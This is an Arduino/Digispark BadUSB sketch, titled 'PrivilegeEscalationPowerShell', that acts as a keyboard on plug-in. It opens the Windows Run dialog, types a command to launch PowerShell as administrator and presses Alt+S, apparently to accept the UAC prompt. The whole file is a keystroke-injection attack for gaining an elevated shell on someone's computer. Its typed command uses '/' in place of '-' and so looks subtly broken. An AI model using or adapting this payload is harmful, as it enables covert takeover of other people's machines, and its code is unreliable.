//PrivilegeEscalationPowerShell
#include <DigiKeyboard.h>
void setup() {
pe();
}
void loop() {
}
void pe() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay (1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay (500);
  DigiKeyboard.print ("powershell Start/Process powershell /Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay (12000);
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
  DigiKeyboard.delay(100);
}
